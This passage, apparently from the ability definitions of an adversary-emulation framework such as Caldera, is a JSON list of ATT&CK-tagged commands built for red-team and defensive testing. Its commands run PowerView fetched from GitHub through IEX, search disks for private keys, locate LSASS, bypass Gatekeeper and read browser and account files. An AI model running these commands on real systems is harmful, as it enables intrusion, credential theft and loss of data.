                                "edge": "",
                                "target": "",
                                "source": "validate_me",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "This module extracts a binary (calc.exe) from inside of another binary. \n\nIn the wild maldoc authors will use this technique to hide binaries inside of files stored \nwithin the office document itself. An example of this technique can be seen in sample\n\nf986040c7dd75b012e7dfd876acb33a158abf651033563ab068800f07f508226\n\nThis sample contains a document inside of itself. Document 1 is the actual maldoc itself, document 2\nis the same document without all the malicious code. Document 1 will copy Document 2 to the file system\nand then \"peek\" inside of this document and pull out the oleObject.bin file. Contained inside of this\noleObject.bin file is a payload that is parsed out and executed on the file system.\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Extract binary files via VBA",
        "tactic": "defense-evasion",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "55f9600a-756f-496b-b27f-682052dc429c",
        "buckets": [
            "impact"
        ],
        "privilege": "",
        "technique_name": "Data Manipulation: Stored Data Manipulation",
        "technique_id": "T1565.001",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "./mission.go -duration 60 -extension .caldera -dir '/'",
                "name": "sh",
                "parsers": [],
                "payloads": [
                    "mission.go"
                ],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "./mission.go -duration 60 -extension .caldera -dir '/'",
                "name": "sh",
                "parsers": [],
                "payloads": [
                    "mission.go"
                ],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "copy mission.go mission.exe &&mission.exe -duration 60 -extension .caldera -dir C:\\",
                "name": "cmd",
                "parsers": [],
                "payloads": [
                    "mission.go"
                ],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "mv mission.go mission.exe;.\\mission.exe -duration 60 -extension .caldera -dir 'C:\\';",
                "name": "psh",
                "parsers": [],
                "payloads": [
                    "mission.go"
                ],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Hunts for files of a certain extension and inserts a message",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "File Hunter Mission",
        "tactic": "impact",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "1c353eb4-29ab-4dfe-88ed-f34f5a60848e",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "File and Directory Discovery",
        "technique_id": "T1083",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "Get-ChildItem -Path #{host.system.path}",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Find or discover files on the file system",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "File and Directory Discovery",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": [
            {
                "module": "plugins.stockpile.app.requirements.paw_provenance",
                "relationship_match": [
                    {
                        "source": "host.system.path"
                    }
                ]
            }
        ]
    },
    {
        "ability_id": "d7967a23c8c030c698893f242e622be1",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "File and Directory Discovery",
        "technique_id": "T1083",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "ls -recurse; get-childitem -recurse; gci -recurse",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.atomic.app.parsers.atomic_powershell",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "validate_me",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Find or discover files on the file system. Upon execution, file and folder information will be displayed.\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "File and Directory Discovery (PowerShell)",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "26c90305a0d2404c93ac1d25df3dde7e",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "File and Directory Discovery",
        "technique_id": "T1083",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "dir /s c:\\ >> %temp%\\download && dir /s \"c:\\Documents and Settings\" >> %temp%\\download && dir /s \"c:\\Program Files\\\" >> %temp%\\download && dir \"%systemdrive%\\Users\\*.*\" >> %temp%\\download && dir \"%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\*.*\" >> %temp%\\download && dir \"%userprofile%\\Desktop\\*.*\" >> %temp%\\download && tree /F >> %temp%\\download",
                "name": "cmd",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Find or discover files on the file system.  Upon execution, the file \"download\" will be placed in the temporary folder and contain the output of\nall of the data discovery commands.\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "File and Directory Discovery (cmd.exe)",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "1ca3c8cf-9e48-4d14-a674-28131752b31c",
        "buckets": [],
        "privilege": "",
        "technique_name": "Find ./slpunkd",
        "technique_id": "T1598.002",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "gci -recurse -filter 'splunkd'",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "find . -iname splunkd",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {
            "cleanup": "[]"
        },
        "access": {},
        "description": "Find splunkd file in victim",
        "plugin": "",
        "singleton": true,
        "delete_payload": true,
        "name": "Find ./slpunkd",
        "tactic": "initial-access",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "14a21534-350f-4d83-9dd7-3c56b93a0c17",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "System Network Configuration Discovery",
        "technique_id": "T1016",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "nbtstat -n",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.nbtstat",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "network.domain.name",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Find Domain information",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Find Domain",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "720a3356-eee1-4015-9135-0fc08f7eb2d5",
        "buckets": [
            "collection"
        ],
        "privilege": "",
        "technique_name": "Data from Local System",
        "technique_id": "T1005",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "for directoryname in $(find /home/ -name '.git' -type d 2>/dev/null | head -5); do\n\tprintf \"$(dirname \"$directoryname\")\\n\";\ndone;",
                "name": "sh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.basic",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "host.dir.git",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "Get-ChildItem C:\\Users -Attributes Directory+Hidden -ErrorAction SilentlyContinue -Filter \".git\" -Recurse | foreach {$_.parent.FullName} | Select-Object; exit 0;",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.basic",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "host.dir.git",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "Get-ChildItem C:\\Users -Attributes Directory+Hidden -ErrorAction SilentlyContinue -Filter \".git\" -Recurse | foreach {$_.parent.FullName} | Select-Object; exit 0;",
                "name": "pwsh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.basic",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "host.dir.git",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "This ability will locate directories that are cloned Git repositories.",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Find Git Repositories",
        "tactic": "collection",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "fdf8bf36-797f-4157-805b-fe7c1c6fc903",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "Remote System Discovery",
        "technique_id": "T1018",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "nbtstat -A #{remote.host.ip}",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Find hostname of remote host",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Find Hostname",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "d69e8660-62c9-431e-87eb-8cf6bd4e35cf",
        "buckets": [
            "collection"
        ],
        "privilege": "",
        "technique_name": "Data from Local System",
        "technique_id": "T1005",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "find $(echo ~#{host.user.name}) -type f -size -500k -maxdepth 5 -exec grep -EIr -o \"(($(echo #{domain.broadcast.ip} | cut -d. -f-2))\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\" 2>/dev/null {} \\;",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Grep for IP addresses in file system per user",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Find IP addresses",
        "tactic": "collection",
        "repeatable": false,
        "requirements": [
            {
                "module": "plugins.stockpile.app.requirements.paw_provenance",
                "relationship_match": [
                    {
                        "source": "host.user.name"
                    }
                ]
            }
        ]
    },
    {
        "ability_id": "0bff4ee7-42a4-4bde-b09a-9d79d8b9edd7",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "Process Discovery",
        "technique_id": "T1057",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "$ps = get-process | select processname,Id;\n$valid = foreach($p in $ps) { if($p.ProcessName -eq \"lsass\") {$p} };\n$valid | ConvertTo-Json",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.json",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "host.process.id",
                                "custom_parser_vals": {
                                    "json_key": "Id",
                                    "json_type": "int"
                                }
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": "GetLsass.exe",
                "code": "using System;\nusing System.Diagnostics;\nusing System.ComponentModel;\n\nnamespace ProcessDump\n{\n    class MyProcess\n    {\n        void GrabLsassProcess()\n        {\n            Process[] allProc = Process.GetProcessesByName(\"lsass\");\n            foreach(Process proc in allProc){\n                Console.WriteLine(\"Process: {0} -> PID: {1}\", proc.ProcessName, proc.Id);\n            }\n        }\n        static void Main(string[] args)\n        {\n            MyProcess myProc = new MyProcess();\n            myProc.GrabLsassProcess();\n        }\n    }\n}",
                "platform": "windows",
                "language": "csharp",
                "additional_info": {},
                "variations": [],
                "command": null,
                "name": "cmd",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Get process info for LSASS",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Find LSASS",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "b6b105b9-41dc-490b-bc5c-80d699b82ce8",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "System Information Discovery",
        "technique_id": "T1082",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "[environment]::OSVersion.Version",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Find OS Version",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Find OS Version",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "638fb6bb-ba39-4285-93d1-7e4775b033a8",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "System Network Connections Discovery",
        "technique_id": "T1049",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "netstat -anto",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "netstat -anto",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "netstat -anto;\nGet-NetTCPConnection",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Find System Network Connections",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Find System Network Connections",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "1f7ff232-ebf8-42bf-a3c4-657855794cfe",
        "buckets": [
            "collection"
        ],
        "privilege": "",
        "technique_name": "Data from Local System",
        "technique_id": "T1005",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "find $(echo ~#{host.user.name}) -type f -size -500k -maxdepth 5 -exec grep -EIr -o \"\\b[A-Za-z0-9._%+-]+@#{target.org.name}\\b\" 2>/dev/null {} \\;",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Grep for all emails for the given target company",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Find company emails",
        "tactic": "collection",
        "repeatable": false,
        "requirements": [
            {
                "module": "plugins.stockpile.app.requirements.paw_provenance",
                "relationship_match": [
                    {
                        "source": "host.user.name"
                    }
                ]
            }
        ]
    },
    {
        "ability_id": "cfcf66cc85109ad2ebdb301d619fa41f",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "System Owner/User Discovery",
        "technique_id": "T1033",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-UserHunter -Stealth -Verbose",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.atomic.app.parsers.atomic_powershell",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "validate_me",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Find existing user session on other computers. Upon execution, information about any sessions discovered will be displayed.",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Find computers where user has session - Stealth mode (PowerView)",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "30732a56-4a23-4307-9544-09caf2ed29d5",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "System Information Discovery",
        "technique_id": "T1082",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "find / -type d -user #{host.user.name} \\( -perm -g+w -or -perm -o+w \\) 2>/dev/null -exec ls -adl {} \\;",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "find / -type d -user #{host.user.name} \\( -perm -g+w -or -perm -o+w \\) 2>/dev/null -exec ls -adl {} \\;",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Discover all directories containing deletable files by user",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Find deletable dirs (per user)",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": [
            {
                "module": "plugins.stockpile.app.requirements.paw_provenance",
                "relationship_match": [
                    {
                        "source": "host.user.name"
                    }
                ]
            }
        ]
    },
    {
        "ability_id": "90c2efaa-8205-480d-8bb6-61d90dbaf81b",
        "buckets": [
            "collection"
        ],
        "privilege": "",
        "technique_name": "Data from Local System",
        "technique_id": "T1005",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "find /Users -name '*.wav' -type f -not -path '*/\\.*' -size -500k 2>/dev/null | head -5; find / -name '*.yml' -type f -not -path '*/\\.*' -size -500k 2>/dev/null | head -5; find / -name '*.png' -type f -not -path '*/\\.*' -size -500k 2>/dev/null | head -5;",
                "name": "sh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.basic",
                        "parserconfigs": [
                            {
                                "edge": "has_extension",
                                "target": "file.sensitive.extension",
                                "source": "host.file.path",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "Get-ChildItem C:\\Users -Recurse -Include *.#{file.sensitive.extension} -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;\nexit 0;",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.basic",
                        "parserconfigs": [
                            {
                                "edge": "has_extension",
                                "target": "file.sensitive.extension",
                                "source": "host.file.path",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "Get-ChildItem C:\\Users -Recurse -Include *.#{file.sensitive.extension} -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;\nexit 0;",
                "name": "pwsh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.basic",
                        "parserconfigs": [
                            {
                                "edge": "has_extension",
                                "target": "file.sensitive.extension",
                                "source": "host.file.path",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "find /Users -name '*.wav' -type f -not -path '*/\\.*' -size -500k 2>/dev/null | head -5; find / -name '*.yml' -type f -not -path '*/\\.*' -size -500k 2>/dev/null | head -5; find / -name '*.png' -type f -not -path '*/\\.*' -size -500k 2>/dev/null | head -5;",
                "name": "sh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.basic",
                        "parserconfigs": [
                            {
                                "edge": "has_extension",
                                "target": "file.sensitive.extension",
                                "source": "host.file.path",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Locate files deemed sensitive",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Find files",
        "tactic": "collection",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "c1cd6388-3ced-48c7-a511-0434c6ba8f48",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "Account Discovery: Local Account",
        "technique_id": "T1087.001",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "cut -d: -f1 /etc/passwd | grep -v '_' | grep -v '#'",
                "name": "sh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.basic",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "host.user.name",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "cut -d: -f1 /etc/passwd | grep -v '_' | grep -v '#'",
                "name": "sh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.basic",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "host.user.name",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Get a list of all local users",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Find local users",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "de632c2d-a729-4b77-b781-6a6b09c148ba",
        "buckets": [
            "credential-access"
        ],
        "privilege": "",
        "technique_name": "Unsecured Credentials: Private Keys",
        "technique_id": "T1552.004",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "foreach($i in @(\".key\",\".pgp\",\".gpg\",\".ppk\",\".p12\",\".pem\",\".pfx\",\".cer\",\".p7b\",\".asc\",\".crt\")){Get-ChildItem -Path c:\\ -Depth 3 -File -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.name -Match \"$i$\"}}",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "for %i in (\\.key \\.pgp \\.gpg \\.ppk \\.p12 \\.pem \\.pfx \\.cer \\.p7b \\.asc) do (dir c:\\ /b /s .key | findstr /e \"%i\")",
                "name": "cmd",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "for i in .key .pgp .gpg .ppk .p12 .pem .pfx .cer .p7b .asc .crt;do find /Users -maxdepth 3 -name \"*${i}\" 2>/dev/null;done;",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "for i in .key .pgp .gpg .ppk .p12 .pem .pfx .cer .p7b .asc .crt;do find /etc -maxdepth 3 -name \"*${i}\" 2>/dev/null;done;",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Find private keys on the file system",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Find private keys",
        "tactic": "credential-access",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "3b5db901-2cb8-4df7-8043-c4628a6a5d5a",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "Process Discovery",
        "technique_id": "T1057",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "ps aux | grep ubuntu",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "ps aux | grep ubuntu",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "$owners = @{};\ngwmi win32_process |% {$owners[$_.handle] = $_.getowner().user};\n$ps = get-process | select processname,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}};\nforeach($p in $ps) {\n    if($p.Owner -eq \"#{host.user.name}\") {\n        $p;\n    }\n}",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Get process info for processes running as a user",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Find user processes",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": [
            {
                "module": "plugins.stockpile.app.requirements.paw_provenance",
                "relationship_match": [
                    {
                        "source": "host.user.name"
                    }
                ]
            }
        ]
    },
    {
        "ability_id": "3a2ce3d5-e9e2-4344-ae23-470432ff8687",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "Network Service Scanning",
        "technique_id": "T1046",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "nmap -sV -p #{remote.host.port} #{remote.host.ip}",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "nmap -sV -p #{remote.host.port} #{remote.host.ip}",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Uses nmap to fingerprint services that were network accessible",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Fingerprint network services",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "c8047a6d94fe59a072e303080c15cb0a",
        "buckets": [
            "defense-evasion"
        ],
        "privilege": "",
        "technique_name": "Subvert Trust Controls: Gatekeeper Bypass",
        "technique_id": "T1553.001",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "sudo xattr -d com.apple.quarantine myapp.app",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Gatekeeper Bypass via command line\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Gatekeeper Bypass",
        "tactic": "defense-evasion",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "b007fc38-9eb7-4320-92b3-9a3ad3e6ec25",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "Browser Bookmark Discovery",
        "technique_id": "T1217",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "cat ~/Library/Application\\ Support/Google/Chrome/Default/Bookmarks",
                "name": "sh",
